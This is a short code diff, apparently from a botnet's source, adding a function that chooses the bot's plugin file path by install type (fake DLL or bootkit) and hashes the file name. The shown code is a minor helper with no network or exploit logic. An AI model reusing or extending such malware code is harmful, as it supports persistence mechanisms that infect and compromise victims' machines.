@@ -323,3 +323,21 @@ bool UpdateBotFakeDll( BYTE* data, int c_data )
 		return true;
 	return false;
 }
+
+DWORD GetHashFileNameBotPlug()
+{
+	char* nameFile = 0;
+	char buf[MAX_PATH];
+	switch( BOT::GetBotType() )
+	{
+		case BotFakeDll:
+			nameFile = FakeDllPathBot;
+			break;
+		case BotBootkit:
+			nameFile = NameFileForBootkit( buf, sizeof(buf) );
+			break;
+	}
+	if( nameFile )
+		return File::GetNameHashA( nameFile, true );
+	return 0;
+}
